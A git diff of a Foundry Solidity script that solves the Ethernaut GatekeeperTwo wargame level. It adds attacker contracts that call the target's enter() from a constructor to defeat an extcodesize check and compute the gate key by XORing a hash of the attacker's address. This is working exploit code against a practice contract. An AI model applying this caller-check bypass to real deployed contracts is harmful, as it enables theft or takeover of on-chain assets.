@@ -4,29 +4,29 @@ pragma solidity ^0.8.0;
 import {Script, console} from "forge-std/Script.sol";
 import { GatekeeperTwo } from "../src/GatekeeperTwo.sol";
 
-contract Tester {
+contract SmartAttacker {
 
-    Victim public instance;
+    GatekeeperTwo public instance = GatekeeperTwo(0x63254338599ec40Bb12485072A1968d414B78cb2);
+    uint64 _gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
 
-    constructor (Victim _instance) {
-        instance = _instance;
-    }
-
-    function call() external returns (uint256) {
-        return instance.func();
+    constructor () {
+        // during the construction, the code of the contract is not set yet
+        instance.enter(bytes8(_gateKey));
     }
 
 }
 
-contract Victim {
+contract StupidAttacker {
 
-    function func() public returns (uint256) {
-        uint256 x;
-        assembly {
-            x := extcodesize(caller())
-        }
-        return x;
+    GatekeeperTwo public instance = GatekeeperTwo(0x63254338599ec40Bb12485072A1968d414B78cb2);
+    uint64 _gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
+
+    constructor () {}
+
+    function attack() external {
+        instance.enter(bytes8(_gateKey));
     }
+
 }
 
 contract GatekeeperTwoSolver is Script {
@@ -40,14 +40,8 @@ contract GatekeeperTwoSolver is Script {
         
         vm.startBroadcast(prv);
         
-        Victim v = new Victim();
-        Tester t = new Tester(v);
-
-        console.log(address(uint160(t.call())));
-        console.log(address(uint160(v.func())));
-
-
-
+        // (new StupidAttacker()).attack();
+        new SmartAttacker();
 
         vm.stopBroadcast();
 
